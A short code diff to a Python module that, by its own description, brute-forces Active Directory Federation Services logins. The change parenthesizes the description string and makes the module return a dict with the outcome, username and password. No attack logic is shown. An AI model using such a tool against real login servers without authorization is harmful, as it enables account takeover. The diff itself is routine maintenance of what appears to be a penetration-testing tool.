@@ -10,10 +10,10 @@ class Module(HTTPModule):
 
     brief_description = 'Active Directory Federated Services'
 
-    description = 'Brute force an ADFS server. NOTE: this module has '
+    description = ('Brute force an ADFS server. NOTE: this module has '
     'not been thoroughly tested and is crude. It effectively '
     'takes a base URL, and just updates the POST body with the supppl'
-    'ied credentials. It may not work on all ADFS versions.'
+    'ied credentials. It may not work on all ADFS versions.')
 
     contributors = [
             dict(
@@ -64,4 +64,9 @@ class Module(HTTPModule):
             valid = 0
 
         # Return the outcome
-        return (valid, username, password,)
+        return dict(
+                outcome=valid,
+                username=username,
+                password=password,
+                events=[])
+
